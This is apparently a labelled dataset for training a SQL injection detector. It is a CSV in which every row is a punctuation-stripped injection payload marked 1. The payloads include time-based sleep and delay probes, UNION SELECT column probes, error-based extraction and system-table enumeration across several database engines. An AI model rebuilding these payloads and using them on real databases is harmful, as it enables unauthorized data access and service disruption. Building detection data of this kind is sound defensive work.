Query,Label
1 elt 4249 4249 7259 xgka like xgka,1
1 7588 7588 waitfor delay 0 0 5,1
1 obzn 7652 7652 select select sleep 5 ydpu,1
4127 union select 9558 9558 9558,1
1 procedure analyse extractvalue 9627 concat 0x5c benchmark 5000000 md5 0x4b774c75 1,1
4208 1133 9010,1
1 3707 select count sysibm systables t1 sysibm systables t2 sysibm systables t3 yqzg yqzg,1
1 select vfmy 5711 5711,1
1 select ldad 6146 6146 rlike select case 7689 7689 1 else 0x28 end,1
1 2006 2006,1
9100 8792 9550,1
1 char 109 char 79 char 70 char 90 regexp substring repeat right char 5012 0 5000000000 null,1
1 elt 3172 7243 7243,1
9613 elt 3125 7084 7084 pupl pupl,1
1 1022 select count user t1 user t2 user t3 user t4 user t5,1
1 select sged 1181 1181 7552 select count rdb field t1 rdb type t2 rdb collation t3 rdb function t4,1
1 union select null null null null null,1
select select sleep 5 srmq mcrt mcrt,1
select benchmark 5000000 md5 0x4c4d6142,1
1 boolean mode 8156 select count generate series 1 5000000,1
4679 9634 9634 union select 9634 9634 9634 9634 9634 9634 9634,1
call regexp substring repeat right char 3702 0 500000000 null,1
1 2967 2967,1
1 5598 5598 3707 select count sysibm systables t1 sysibm systables t2 sysibm systables t3,1
1 row 6237 7469 select count concat 0x7171706a71 select elt 6237 6237 1 0x717a767a71 floor rand 0 2 x select 5192 union select 3785 union select 3931 union select 7158 group x zoag like zoag,1
select sleep 5 yrpn,1
select count domain domain t1 domain column t2 domain table t3 kuqm,1
1 union select null null null null null null null,1
6548 union select 6067 6067 6067 6067 6067 6067 6067 6067 6067,1
5352 2724 char 113 char 113 char 112 char 106 char 113 select case 2724 2724 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113,1
1 8135 8135,1
1 turj 1237 1237,1
1 select gdzt 4950 4950,1
1 nncz 2331 2331,1
5571 union select 8846 8846 8846 8846 8846 8846 8846,1
1 4241 convert int select char 113 char 113 char 112 char 106 char 113 select case 4241 4241 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 eimq eimq,1
1 waitfor delay 0 0 5 syhx syhx,1
8667 select ymmg 6132 6132 union select 6132 6132 6132 6132 6132 6132 6132 6132,1
1 9605 9605 procedure analyse extractvalue 5840 concat 0x5c 0x7171706a71 select case 5840 5840 1 else 0 end 0x717a767a71 1,1
2223 mjwp 8650 8650 7900 5838,1
1 exp select select concat 0x7171706a71 select elt 8190 8190 1 0x717a767a71 0x78 x ibrj ibrj,1
select case 6843 2657 6843 else 6843 select 6843 information schema character set end,1
1 8407 select count generate series 1 5000000 pufu like pufu,1
1 3707 select count sysibm systables t1 sysibm systables t2 sysibm systables t3 ytju like ytju,1
1 qlkf 6635 6635,1
waitfor delay 0 0 5,1
9569 union select 8405 8405 8405 8405,1
5755 3581 7566,1
1 4241 convert int select char 113 char 113 char 112 char 106 char 113 select case 4241 4241 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 fktl fktl,1
7084 union select 5727 5727 5727 5727 5727 5727 5727 5727 5727 5727,1
1 select 2 select select concat 0x7171706a71 select elt 8113 8113 1 0x717a767a71 0x78 8446744073709551610 8446744073709551610 viti,1
1 2853 cast chr 113 chr 113 chr 112 chr 106 chr 113 select case 2853 2853 1 else 0 end text chr 113 chr 122 chr 118 chr 122 chr 113 numeric ukzb ukzb,1
1 2802 2802 union select null null null,1
1 myxo 1759 1759 union select null,1
1 8407 select count generate series 1 5000000 ksxz ksxz,1
select case 3168 5577 3168 else 3168 select 3168 mysql db end,1
1 waitfor delay 0 0 5,1
1 select 2 select select concat 0x7171706a71 select elt 8113 8113 1 0x717a767a71 0x78 8446744073709551610 8446744073709551610 onmp onmp,1
7248 3440 cast chr 113 chr 113 chr 112 chr 106 chr 113 select case 3440 3440 1 else 0 end text chr 113 chr 122 chr 118 chr 122 chr 113 numeric qgms qgms,1
1 6240 qqpjq select case 6240 6240 1 else 0 end rdb database qzvzq,1
7234 union select 3154 3154 3154 3154,1
call regexp substring repeat right char 3702 0 500000000 null,1
2959 union select 3414 3414 3414 3414 3414 3414 3414 3414,1
8521 select ucim 9003 9003 union select 9003,1
1 order 1,1
1 9656 9656 sleep 5,1
2500 union select 6853 6853 6853 6853,1
1 select wkbg 3921 3921 8407 select count generate series 1 5000000,1
1 6969 select 6969 pg sleep 5 glfq like glfq,1
8353 5023 ctxsys drithsx sn 5023 chr 113 chr 113 chr 112 chr 106 chr 113 select case 5023 5023 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113 ptlz ptlz,1
1 9254 select count rdb field t1 rdb type t2 rdb collation t3 rdb function t4,1
2817 8255 3841,1
4330 union select 3059 3059 3059 3059 3059 3059 3059 3059 3059,1
iif 7036 2370 1 1 0,1
select sleep 5 pwpc pwpc,1
6457 1764 1764 union select 1764 1764 1764 1764 1764 1764 1764 1764,1
5054 union select 8263 8263 8263 8263,1
1 extractvalue 1297 concat 0x5c 0x7171706a71 select elt 1297 1297 1 0x717a767a71,1
select count sysibm systables t1 sysibm systables t2 sysibm systables t3 fwok like fwok,1
7395 order 1,1
1 9241 9241 union select null,1
1 8483 8483 char 117 char 111 char 105 char 100 regexp substring repeat left crypt key char 65 char 69 char 83 null 0 500000000 null,1
1 select sacd 5984 5984 union select null null null null null null null,1
1 6248 6248 2388 benchmark 5000000 md5 0x6d457153,1
1 fmul 7827 7827,1
8258 swjp 2681 2681 union select 2681 2681 2681 2681 2681 2681,1
4518 8023 8023 6872 6872,1
1 gxpb 7107 7107 exp select select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x,1
8355 union select 3004 3004 3004 3004 3004 3004 3004,1
1 select tnch 1867 1867 char 117 char 111 char 105 char 100 regexp substring repeat left crypt key char 65 char 69 char 83 null 0 500000000 null,1
3924 select ssld dual 6229 6229 union select 6229 6229 6229 6229 6229,1
select benchmark 5000000 md5 0x4c4d6142 fgcg fgcg,1
5830 1570 convert int select char 113 char 113 char 112 char 106 char 113 select case 1570 1570 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113,1
1 6793 select 6793 pg sleep 5 azmf azmf,1
1 7417 select count sysibm systables t1 sysibm systables t2 sysibm systables t3,1
1 select case 4587 4587 regexp substring repeat left crypt key char 65 char 69 char 83 null 0 500000000 null else char 76 char 65 char 102 char 72 end value 0 xhqc xhqc,1
1 select case 5451 5451 regexp substring repeat right char 5451 0 500000000 null else char 108 char 76 char 112 char 116 end information schema system user rbhe rbhe,1
1 3715 char 113 char 113 char 112 char 106 char 113 select case 3715 3715 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113,1
1 char 120 char 106 char 117 char 85 regexp substring repeat right char 9981 0 5000000000 null vunt vunt,1
1 8315 select count sysibm systables t1 sysibm systables t2 sysibm systables t3 bmbt bmbt,1
1 iovi 3910 3910 5356 select count sysusers sys1 sysusers sys2 sysusers sys3 sysusers sys4 sysusers sys5 sysusers sys6 sysusers sys7,1
1 4182 4182 exp select select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x,1
8065 order 1,1
1 order 1,1
1 extractvalue 1297 concat 0x5c 0x7171706a71 select elt 1297 1297 1 0x717a767a71 1185 1185,1
1 znak 5203 5203,1
2348 sige 1639 1639 3440 cast chr 113 chr 113 chr 112 chr 106 chr 113 select case 3440 3440 1 else 0 end text chr 113 chr 122 chr 118 chr 122 chr 113 numeric,1
1 qgok 3993 3993 3824 benchmark 5000000 md5 0x76555642,1
1 waitfor delay 0 0 5 koni like koni,1
1748 union select 2987,1
1 jzzo 7773 7773 union select null null null null null,1
8344 1570 convert int select char 113 char 113 char 112 char 106 char 113 select case 1570 1570 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 wjpa,1
1 union select null null null null null null null,1
1 3738 3738 8421 select count generate series 1 5000000,1
select generate series 6414 6414 case 6414 6455 1 else 0 end limit 1,1
1 spvl 2242 2242 6793 select 6793 pg sleep 5,1
1 6414 select count rdb field t1 rdb type t2 rdb collation t3 rdb function t4 4557 4557,1
1 procedure analyse extractvalue 9627 concat 0x5c benchmark 5000000 md5 0x4b774c75 1,1
1 select bjav 6923 6923 select select sleep 5 gcrr,1
8633 5099 5974,1
end hizd hizd,1
1 1668 8054 8054,1
1643 1968 1968 3484 6642,1
1 char 68 char 69 char 97 char 85 regexp substring repeat right char 5389 0 5000000000 null gxgi gxgi,1
1 5236 5236 char 68 char 69 char 97 char 85 regexp substring repeat right char 5389 0 5000000000 null,1
1 select yags 6268 6268 3707 select count sysibm systables t1 sysibm systables t2 sysibm systables t3,1
1 6537 dbms pipe receive message chr 76 chr 116 chr 117 chr 65 5 qpzj like qpzj,1
1 procedure analyse extractvalue 9627 concat 0x5c benchmark 5000000 md5 0x4b774c75 1,1
1 9898 9898 4241 convert int select char 113 char 113 char 112 char 106 char 113 select case 4241 4241 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113,1
select count sysibm systables t1 sysibm systables t2 sysibm systables t3 vcgc like vcgc,1
1 2070 2070,1
9142 1570 convert int select char 113 char 113 char 112 char 106 char 113 select case 1570 1570 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113,1
1 3580 select count domain domain t1 domain column t2 domain table t3,1
8933 iiyr 1974 1974 union select 1974 1974 1974 1974 1974,1
1 gdie 8133 8133 rlike select case 7689 7689 1 else 0x28 end,1
1 select puco 2605 2605 union select null,1
1 7552 select count rdb field t1 rdb type t2 rdb collation t3 rdb function t4,1
1 7427 dbms pipe receive message chr 116 chr 87 chr 90 chr 109 5,1
1 rlike select case 2671 4485 1 else 0x28 end ezco like ezco,1
1 select uqdb 3508 3508 4915 select count domain domain t1 domain column t2 domain table t3,1
3437 union select 7774 7774 7774,1
select case 2914 3335 2914 else cast 1 int select 0 dual end dual,1
6341 5903 qqpjq select case 5903 5903 1 else 0 end rdb database qzvzq ugys ugys,1
call regexp substring repeat right char 3702 0 500000000 null nwjv nwjv,1
1 7249 7249 union select null null null null null null null null null null,1
1097 4421 4421 union select 4421 4421 4421 4421 4421,1
1 6537 dbms pipe receive message chr 76 chr 116 chr 117 chr 65 5,1
8274 union select 3048,1
6203 4747 dbms utility sqlid sqlhash chr 113 chr 113 chr 112 chr 106 chr 113 select case 4747 4747 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113 luee luee,1
1 select 2 select select concat 0x7171706a71 select elt 8113 8113 1 0x717a767a71 0x78 8446744073709551610 8446744073709551610 nazb nazb,1
1 8835 8835 8384 like abcdefg upper hex randomblob 500000000 2,1
5581 union select 4266 4266 4266 4266 4266 4266 4266 4266 4266 4266,1
select sleep 5 mlmu mlmu,1
1 6414 select count rdb field t1 rdb type t2 rdb collation t3 rdb function t4 jmub jmub,1
3960 union select 7813 7813 7813 7813 7813 7813,1
1 6082 6082 select 9067 select count concat 0x7171706a71 select elt 9067 9067 1 0x717a767a71 floor rand 0 2 x information schema character set group x,1
7793 8459 8459 4906 lias lias,1
1 6853 6853 exp select select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x,1
1,1
1 select yyyn 5395 5395,1
1 4386 utl inaddr get host address chr 113 chr 113 chr 112 chr 106 chr 113 select case 4386 4386 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113 sgdj like sgdj,1
1 3754 select upper xmltype chr 60 chr 58 chr 113 chr 113 chr 112 chr 106 chr 113 select case 3754 3754 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113 chr 62 dual,1
3359 union select 4675 4675 4675,1
1 9545 9545 9198 9198,1
1 exp select select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x luoj luoj,1
9263 qodg 6798 6798 5023 ctxsys drithsx sn 5023 chr 113 chr 113 chr 112 chr 106 chr 113 select case 5023 5023 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113,1
1011 7140 9977,1
select case 3539 8768 3539 else cast 1 int select 0 dual end dual,1
1 5556 select count user t1 user t2 user t3 user t4 user t5 hfxu like hfxu,1
1 6969 select 6969 pg sleep 5 pkcp,1
1 select select sleep 5 fzno yctp yctp,1
1 2388 2388 union select null null null null null null null null null,1
1 union select null null null,1
1 select 9067 select count concat 0x7171706a71 select elt 9067 9067 1 0x717a767a71 floor rand 0 2 x information schema character set group x tepf tepf,1
1 union select null null,1
1 select 9067 select count concat 0x7171706a71 select elt 9067 9067 1 0x717a767a71 floor rand 0 2 x information schema character set group x,1
8436 frmf 7225 7225 make set 9354 9354 7185,1
select select sleep 5 srmq pfle like pfle,1
1 uyns 4751 4751 select select sleep 5 fzno,1
1 elt 4249 4249 7259 ifca like ifca,1
2625 qfuo 1980 1980 union select 1980 1980 1980,1
1 waitfor delay 0 0 5 tuhy like tuhy,1
1 3330 3330 6414 select count rdb field t1 rdb type t2 rdb collation t3 rdb function t4,1
1 9226 9226 9660 select count user t1 user t2 user t3 user t4 user t5,1
1 uqkn 4642 4642 elt 6272 6272 sleep 5,1
1 union select null null null null null null null,1
1 knyf 8109 8109 8384 like abcdefg upper hex randomblob 500000000 2,1
1 5556 select count user t1 user t2 user t3 user t4 user t5 ccsb ccsb,1
1 pjjz 8384 8384 extractvalue 7982 concat 0x5c 0x7171706a71 select elt 7982 7982 1 0x717a767a71,1
1 uytv 7875 7875 7417 select count sysibm systables t1 sysibm systables t2 sysibm systables t3,1
select generate series 3341 3341 case 3341 3072 1 else 0 end limit 1,1
4407 2055 2055 elt 9714 5040 5040,1
5898 fycd 7135 7135 1570 convert int select char 113 char 113 char 112 char 106 char 113 select case 1570 1570 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113,1
1 8978 8978 union select null null null null null null null null,1
1 9254 select count rdb field t1 rdb type t2 rdb collation t3 rdb function t4,1
1 2633 dbms pipe receive message chr 112 chr 65 chr 65 chr 103 5 stqq stqq,1
1,1
1 vycb 3524 3524 6414 select count rdb field t1 rdb type t2 rdb collation t3 rdb function t4,1
3731 elt 7540 1412 1412 iwch iwch,1
1 8315 select count sysibm systables t1 sysibm systables t2 sysibm systables t3 zzcd zzcd,1
2951 4144 select upper xmltype chr 60 chr 58 chr 113 chr 113 chr 112 chr 106 chr 113 select case 4144 4144 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113 chr 62 dual gwqv,1
select count rdb field t1 rdb type t2 rdb collation t3 rdb function t4 6977 6977,1
1 pkkx 6716 6716 updatexml 3393 concat 0x2e 0x7171706a71 select elt 3393 3393 1 0x717a767a71 1161,1
1 juxt 5956 5956 8148 like abcdefg upper hex randomblob 500000000 2,1
1 zffq 9572 9572 6793 select 6793 pg sleep 5,1
1 select 2 select select concat 0x7171706a71 select elt 3484 3484 1 0x717a767a71 0x78 8446744073709551610 8446744073709551610,1
1 char 119 char 100 char 99 char 121 regexp substring repeat right char 1441 0 5000000000 null,1
4746 5023 ctxsys drithsx sn 5023 chr 113 chr 113 chr 112 chr 106 chr 113 select case 5023 5023 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113,1
1157 sxie 7118 7118 5023 ctxsys drithsx sn 5023 chr 113 chr 113 chr 112 chr 106 chr 113 select case 5023 5023 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113,1
1 make set 4553 8132 8132 pfci like pfci,1
2211 2113 8885,1
1 4386 utl inaddr get host address chr 113 chr 113 chr 112 chr 106 chr 113 select case 4386 4386 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113 nfix nfix,1
4797 union select 8223 8223 8223 8223 8223 8223 8223 8223,1
1 select case 5451 5451 regexp substring repeat right char 5451 0 500000000 null else char 108 char 76 char 112 char 116 end information schema system user efpc like efpc,1
1 3202 like abcdefg upper hex randomblob 500000000 2 6265 6265,1
1 select select sleep 5 fzno uncg uncg,1
1 3715 char 113 char 113 char 112 char 106 char 113 select case 3715 3715 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113,1
select case 9337 9337 waitfor delay 0 0 5 else 9337 select 9337 master sysdatabases end,1
1 boolean mode exp select select concat 0x7171706a71 select elt 8190 8190 1 0x717a767a71 0x78 x,1
8725 8459 8459 4906 vblw like vblw,1
1,1
1 5835 6157 bjee like bjee,1
make set 5679 9769 9769,1
1 5629 5629,1
4528 5903 qqpjq select case 5903 5903 1 else 0 end rdb database qzvzq fxmt like fxmt,1
7636 5898 8880 sjuv sjuv,1
3747 union select 8962 8962 8962 8962 8962,1
8893 union select 7594 7594 7594 7594 7594 7594,1
1 sleep 5 2211 2211,1
1 select lnhq 7526 7526,1
8513 4493 utl inaddr get host address chr 113 chr 113 chr 112 chr 106 chr 113 select case 4493 4493 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113 5818 5818,1
1 6793 select 6793 pg sleep 5,1
1 4520 4520,1
1 8945 8945 6240 qqpjq select case 6240 6240 1 else 0 end rdb database qzvzq,1
1 7533 7533,1
6996 1 group concat 0x7171706a71 select case 4232 4232 1 else 0 end 0x717a767a71 floor rand 0 2 min 0,1
1 select qjwf dual 3187 3187 char 120 char 106 char 117 char 85 regexp substring repeat right char 9981 0 5000000000 null,1
1 8421 select count generate series 1 5000000 cdai cdai,1
1 select 6825 select count concat 0x7171706a71 select elt 6825 6825 1 0x717a767a71 floor rand 0 2 x information schema character set group x,1
1258 union select 7734 7734 7734,1
1 4386 utl inaddr get host address chr 113 chr 113 chr 112 chr 106 chr 113 select case 4386 4386 1 else 0 end dual chr 113 chr 122 chr 118 chr 122 chr 113 lexm,1
1 select 9067 select count concat 0x7171706a71 select elt 9067 9067 1 0x717a767a71 floor rand 0 2 x information schema character set group x lywy like lywy,1
1 6518 6518,1
1 3715 char 113 char 113 char 112 char 106 char 113 select case 3715 3715 char 49 else char 48 end char 113 char 122 char 118 char 122 char 113,1
1 5071 5071 union select null null null null null null null,1
1 5547 5547,1
1 8908 8908 7417 select count sysibm systables t1 sysibm systables t2 sysibm systables t3,1
